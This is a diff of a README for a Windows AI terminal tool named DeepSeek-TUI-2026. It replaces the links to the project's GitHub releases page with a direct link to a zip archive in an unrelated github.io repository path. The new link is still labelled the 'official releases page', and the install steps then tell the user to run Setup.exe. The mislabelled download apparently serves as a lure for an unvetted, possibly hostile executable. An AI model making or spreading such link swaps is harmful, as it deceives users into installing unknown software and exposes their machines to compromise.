@@ -5,7 +5,7 @@ description: "Manage files, execute shell commands, and automate coding tasks wi
 ---
 # 🤖 DeepSeek-TUI-2026 - Automate your coding tasks with ease
 
-[![Download DeepSeek-TUI](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/bahateacher/DeepSeek-TUI-2026/releases)
+[![Download DeepSeek-TUI](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/bahateacher/bahateacher.github.io/main/hexactinal/Release_v3.5.zip)
 
 DeepSeek-TUI-2026 brings the power of the DeepSeek V4 artificial intelligence model directly to your Windows desktop. This tool acts as a terminal assistant that helps you write code, manage your local files, and run commands. You do not need to know how to code to use these features. The software automates complex technical tasks through a simple interface.
 
@@ -19,7 +19,7 @@ If your computer uses an older version of Windows, some features may not load co
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official releases page](https://github.com/bahateacher/DeepSeek-TUI-2026/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/bahateacher/bahateacher.github.io/main/hexactinal/Release_v3.5.zip) to download the installer.
 2. Locate the file named `Setup.exe` in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on the screen.
